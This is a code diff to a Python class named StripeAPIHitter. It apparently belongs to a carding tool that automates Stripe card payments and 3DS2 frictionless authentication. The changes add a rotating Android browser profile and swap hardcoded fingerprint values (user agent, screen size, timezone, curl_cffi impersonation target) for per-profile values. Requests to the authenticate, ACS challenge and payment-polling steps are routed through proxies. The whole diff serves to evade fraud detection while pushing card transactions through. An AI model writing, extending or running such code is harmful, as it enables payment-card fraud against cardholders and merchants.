@@ -979,6 +979,17 @@ class StripeAPIHitter:
         
         BROWSER_PROFILES = [
             {
+                "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+                "impersonate": "chrome124",
+                "platform": "Android",
+                "color_depth": "24",
+                "screen_height": "892",
+                "screen_width": "412",
+                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+                "sec-ch-ua-mobile": "?1",
+                "sec-ch-ua-platform": '"Android"'
+            },
+            {
                 "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                 "impersonate": "chrome124",
                 "platform": "Win32",
@@ -1640,13 +1651,12 @@ class StripeAPIHitter:
                                     processed_auth = True
                                 elif source:
                                     # Multi-variation 3DS2 frictionless authenticate loop
-                                    _auth_ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                                     auth_headers = {
                                         "accept": "application/json",
                                         "content-type": "application/x-www-form-urlencoded",
                                         "origin": "https://js.stripe.com",
                                         "referer": "https://js.stripe.com/",
-                                        "user-agent": _auth_ua
+                                        "user-agent": profile["user_agent"]
                                     }
                                     if self.stripe_account:
                                         auth_headers["Stripe-Account"] = self.stripe_account
@@ -1668,11 +1678,11 @@ class StripeAPIHitter:
                                             "threeDSRequestorChallengeInd": var["threeDSRequestorChallengeInd"],
                                             "browserJavaEnabled": False,
                                             "browserJavascriptEnabled": True,
-                                            "browserLanguage": "en-US",
-                                            "browserColorDepth": "24",
-                                            "browserScreenHeight": "873",
-                                            "browserScreenWidth": "393",
-                                            "browserTZ": "-300",
+                                            "browserLanguage": locale,
+                                            "browserColorDepth": profile.get("color_depth", "24"),
+                                            "browserScreenHeight": profile.get("screen_height", "1080"),
+                                            "browserScreenWidth": profile.get("screen_width", "1920"),
+                                            "browserTZ": str(tz_id) if isinstance(tz_id, int) else "-300",
                                             "browserUserAgent": auth_headers["user-agent"]
                                         }
                                         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
@@ -1689,7 +1699,7 @@ class StripeAPIHitter:
                                         try:
                                             auth_resp_raw = await loop.run_in_executor(None, lambda data=auth_data: cffi_requests.post(
                                                 auth_url, headers=auth_headers, data=data,
-                                                proxies=proxies, timeout=25, impersonate="chrome120"))
+                                                proxies=proxies, timeout=25, impersonate=profile["impersonate"]))
                                             auth_json = auth_resp_raw.json()
                                             state = auth_json.get("state")
                                             if state in ["succeeded", "authenticated"]:
@@ -1705,14 +1715,14 @@ class StripeAPIHitter:
                                             comp_data = {"source": source, "key": pk}
                                             if acs_url and creq:
                                                 try:
-                                                    acs_headers = {"User-Agent": _auth_ua, "Content-Type": "application/x-www-form-urlencoded"}
+                                                    acs_headers = {"User-Agent": profile["user_agent"], "Content-Type": "application/x-www-form-urlencoded"}
                                                     await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate="chrome120"))
+                                                        acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                 except Exception:
                                                     pass
                                                     
                                             try:
-                                                await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate="chrome120"))
+                                                await loop.run_in_executor(None, lambda: cffi_requests.post(comp_url, data=comp_data, headers=auth_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                             except Exception:
                                                 pass
                                                 
@@ -1745,7 +1755,7 @@ class StripeAPIHitter:
                                     for poll_idx in range(3):
                                         poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
                                             poll_url, headers=poll_headers, proxies=proxies,
-                                            timeout=30, impersonate="chrome120"))
+                                            timeout=30, impersonate=profile["impersonate"]))
                                         poll_json = poll_resp_raw.json()
                                         status_2 = poll_json.get('status')
                                         if status_2 in ['succeeded', 'requires_capture', 'complete']:
